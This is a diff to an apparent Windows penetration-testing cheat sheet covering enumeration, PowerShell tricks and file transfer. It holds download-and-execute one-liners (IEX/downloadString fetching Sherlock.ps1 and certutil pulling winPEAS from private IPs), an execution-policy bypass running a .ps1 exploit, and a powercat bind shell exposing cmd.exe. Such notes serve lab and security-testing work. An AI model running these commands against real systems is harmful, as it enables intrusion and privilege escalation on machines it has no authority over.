@@ -3,6 +3,8 @@
 ### Enumeration & Commands
 
 ```
+cmd.exe /c dir
+
 systeminfo
 schtasks /query /fo LIST /v		# scheduled task
 wmic service get name,displayname,pathname,startmode    # list all the running services
@@ -92,6 +94,9 @@ Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap
 #### PowerShell
 
 ```
+powershell -nop -ep bypass -f C:\Users\tony\49382.ps1
+Set-ExecutionPolicy Unrestricted
+
 Import-Module [filename].ps1
 C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
 IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
@@ -102,7 +107,6 @@ nltest /domain_trusts   # show inbound/outbound trust
 Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
 Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
 Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *		# retrieve item in recycle bin
-Set-ExecutionPolicy Unrestricted
 powershell "iex(new-object net.webclient).downloadString('http://192.168.119.218/Sherlock.ps1');Find-AllVulns"
 klist   # list the cached Kerberos tickets
 
@@ -170,7 +174,7 @@ powercat -l -p 443 -e cmd.exe   # bind shell
 ### wget equivalant / file transfer
 
 ```
-certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
+certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe C:/Windows/temp/winPEASany.exe
 
 --------Windows to Linux (SMB)----------
 Method 1: 
